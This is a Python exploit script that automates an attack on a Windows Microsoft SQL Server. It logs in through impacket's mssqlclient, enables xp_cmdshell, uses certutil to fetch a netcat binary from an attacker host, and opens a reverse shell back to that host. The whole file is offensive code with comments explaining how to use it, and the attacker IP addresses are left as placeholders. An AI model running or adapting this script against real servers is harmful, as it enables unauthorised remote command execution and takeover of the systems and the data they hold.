#This is for exploiting windows mysql server with xp command. 
#we will use impacket and python scripting to automate getting a remote shell. NOT root, but user.
#host file with a python3 server, listen with netcat on 443, run the exploit and pick up a shell at the netcat listener.
import pexpect
import time

def enable_cmdshell(): #we are enabling, spawning and connecting to a spawn shell in a windows machine
    child.sendline("sp_configure 'show advanced options', '1'")
    print("Enabling xp_cmdshell")
    child.expect(confirmation)
    child.sendline("RECONFIGURE")
    child.sendline("sp_configure 'xp_cmdshell', '1'")
    child.expect(confirmation)
    child.sendline("RECONFIGURE")

def spawn_shell():
    print("Upload netcat binary...")
    child.sendline("EXEC master..xp_cmdshell 'certutil -urlcache -split -f http:// ip address/nc.exe C:/users/public/nc.exe'")#add ATTACKER IP
    time.sleep(5)
    print("Spawning shell")
    child.sendline("EXEC master ..xp_cmdshell 'C:/users/public/nc.exe ip address -e cmd.exe'")
    time.sleep(5)
    print("closing...")
    child.close()


def connect():
    print("Connecting to remote MSSQL DB...")
    child.expect(pass_prompt)
    child.sendline('Password')
    print("logging in")
    child.expect(sql_prompt)
    print("success...")

if __name__ == '__main__':
    sql_prompt = "SQL>"
    confirmation = "to install\."
    pass_prompt = "Password:"
    command ="impacket-mssqlclient sa@ <ip address" #add ip address before running exploit
    child = pexpect.spawn(command)
    connect()
    enable_cmdshell()

